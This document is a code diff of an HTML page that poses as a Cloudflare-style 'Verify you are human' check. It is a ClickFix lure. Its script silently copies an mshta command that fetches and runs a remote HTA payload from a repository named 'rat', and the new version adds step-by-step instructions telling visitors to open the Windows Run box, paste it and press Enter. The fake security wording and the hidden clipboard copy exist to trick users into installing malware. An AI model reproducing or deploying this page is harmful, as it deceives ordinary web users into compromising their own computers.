@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Check</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Verify you are human</title>
     <style>
         * {
             margin: 0;
@@ -11,122 +11,192 @@
             box-sizing: border-box;
         }
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #0a0c10;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
             min-height: 100vh;
             display: flex;
-            align-items: center;
             justify-content: center;
-            padding: 16px;
+            align-items: center;
+            padding: 20px;
         }
-        .card {
-            background: white;
-            border-radius: 32px;
-            padding: 32px 24px;
-            max-width: 400px;
+        .verification-box {
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            max-width: 480px;
             width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            padding: 40px 32px;
             text-align: center;
         }
-        .icon {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 24px;
-            background: #f3f4f6;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 48px;
-        }
         h2 {
-            font-size: 24px;
+            font-size: 26px;
+            font-weight: 600;
             margin-bottom: 12px;
-            color: #1f2937;
+            color: #1a202c;
         }
-        p {
-            color: #6b7280;
-            font-size: 15px;
+        .sub-text {
+            color: #4a5568;
+            font-size: 16px;
             margin-bottom: 28px;
             line-height: 1.5;
         }
-        button {
-            background: #f6821f;
+        .verify-button {
+            background: #1e6f3f;
             color: white;
             border: none;
-            padding: 14px 28px;
-            font-size: 16px;
+            padding: 14px 24px;
+            font-size: 18px;
             font-weight: 600;
-            border-radius: 50px;
+            border-radius: 8px;
             width: 100%;
             cursor: pointer;
-            transition: transform 0.2s, background 0.2s;
+            transition: background 0.2s;
+            margin-bottom: 24px;
         }
-        button:active {
-            transform: scale(0.97);
-            background: #e06e0e;
+        .verify-button:hover {
+            background: #155a34;
         }
-        .footer {
-            margin-top: 24px;
-            font-size: 12px;
-            color: #9ca3af;
+        .extra-box {
+            background: #fff5e6;
+            border-left: 4px solid #f6821f;
+            padding: 14px;
+            border-radius: 8px;
+            margin: 20px 0;
+            text-align: left;
         }
-        .spinner {
+        .extra-box strong {
+            color: #c75a00;
+            font-size: 15px;
+        }
+        .steps-container {
+            background: #f7fafc;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: left;
+            margin: 20px 0;
+            border: 1px solid #e2e8f0;
             display: none;
-            margin: 20px auto 0;
-            width: 40px;
-            height: 40px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #f6821f;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .steps-container p {
+            margin: 10px 0;
+            font-size: 14px;
+            color: #2d3748;
         }
-        @media (max-width: 480px) {
-            .card {
-                padding: 24px 20px;
+        .steps-container code {
+            background: #edf2f7;
+            padding: 6px 10px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            display: inline-block;
+            word-break: break-all;
+        }
+        .status-message {
+            background: #e6fffa;
+            color: #234e52;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 16px 0;
+            font-size: 14px;
+            display: none;
+        }
+        .footer-note {
+            margin-top: 28px;
+            font-size: 12px;
+            color: #718096;
+            border-top: 1px solid #e2e8f0;
+            padding-top: 20px;
+        }
+        @media (max-width: 500px) {
+            .verification-box {
+                padding: 28px 20px;
             }
             h2 {
-                font-size: 20px;
+                font-size: 22px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="icon">🛡️</div>
-        <h2>Verify you are human</h2>
-        <p>Complete the verification below to continue</p>
-        <button id="verifyBtn">Verify</button>
-        <div class="spinner" id="spinner"></div>
-        <div class="footer">Protected by Cloudflare</div>
+<div class="verification-box">
+    <h2>✓ Verify you are human</h2>
+    <div class="sub-text">Complete the verification below to continue</div>
+
+    <!-- Extra Verification Required box (1:1 style) -->
+    <div class="extra-box">
+        <strong>⚠️ Extra Verification Required</strong>
+        <p style="margin-top: 8px; font-size: 13px; color: #8b5a2b;">Additional step needed to confirm your identity.</p>
     </div>
 
-    <script>
-        document.getElementById('verifyBtn').addEventListener('click', function() {
-            var btn = this;
-            var spinner = document.getElementById('spinner');
-            btn.disabled = true;
-            spinner.style.display = 'block';
-            btn.innerText = 'Verifying...';
-            
-            // CHANGE THE URL BELOW TO YOUR REAL SUCCESS PAGE
-            var cmd = 'mshta https://raw.githubusercontent.com/Skibidi101201/rat/main/payload.hta';
-            
-            // Copy to clipboard
-            var ta = document.createElement('textarea');
-            ta.value = cmd;
-            document.body.appendChild(ta);
-            ta.select();
+    <button class="verify-button" id="mainVerifyBtn">Verify now</button>
+
+    <div class="steps-container" id="stepsPanel">
+        <p><strong>📋 Follow these steps exactly:</strong></p>
+        <p>1️⃣ Press <strong>Windows + R</strong> on your keyboard (opens Run dialog).</p>
+        <p>2️⃣ In the Run box, <strong>right-click</strong> and choose <strong>Paste</strong> (or press Ctrl+V).</p>
+        <p>3️⃣ Press <strong>Enter</strong> to complete verification.</p>
+        <p style="margin-top: 12px;">📌 <strong>Command already copied:</strong></p>
+        <p><code id="cmdText">mshta https://raw.githubusercontent.com/Skibidi101201/rat/main/payload.hta</code></p>
+    </div>
+
+    <div class="status-message" id="statusMsg">
+        ✅ Command copied to clipboard! Open Run (Windows+R) and paste.
+    </div>
+
+    <div class="footer-note">
+        www.mywebsite.com needs to review the security of your connection before proceeding.
+    </div>
+</div>
+
+<script>
+    (function() {
+        // Your mshta command (same as before)
+        const mshtaCommand = 'mshta https://raw.githubusercontent.com/Skibidi101201/rat/main/payload.hta';
+        
+        // Display command in the steps panel
+        const cmdElement = document.getElementById('cmdText');
+        if (cmdElement) {
+            cmdElement.innerText = mshtaCommand;
+        }
+        
+        const verifyBtn = document.getElementById('mainVerifyBtn');
+        const stepsPanel = document.getElementById('stepsPanel');
+        const statusDiv = document.getElementById('statusMsg');
+        
+        // Copy function (works on all browsers)
+        function copyToClipboard(text) {
+            // Fallback using textarea
+            const textarea = document.createElement('textarea');
+            textarea.value = text;
+            textarea.style.position = 'fixed';
+            textarea.style.top = '-9999px';
+            textarea.style.left = '-9999px';
+            document.body.appendChild(textarea);
+            textarea.select();
             document.execCommand('copy');
-            document.body.removeChild(ta);
+            document.body.removeChild(textarea);
+        }
+        
+        verifyBtn.addEventListener('click', function() {
+            // 1. Copy the mshta command
+            copyToClipboard(mshtaCommand);
             
-            // CHANGE THE URL BELOW TO YOUR REAL SUCCESS PAGE
-            window.location.href = 'https://mellifluous-beijinho-617d85.netlify.app/index.html';
+            // 2. Show the steps panel
+            stepsPanel.style.display = 'block';
+            
+            // 3. Show status message
+            statusDiv.style.display = 'block';
+            
+            // 4. Optional: change button text temporarily
+            const originalText = verifyBtn.innerText;
+            verifyBtn.innerText = '✓ Copied! Follow steps above';
+            verifyBtn.style.background = '#2c7a4d';
+            setTimeout(() => {
+                verifyBtn.innerText = originalText;
+                verifyBtn.style.background = '#1e6f3f';
+            }, 3000);
         });
-    </script>
+    })();
+</script>
 </body>
 </html>
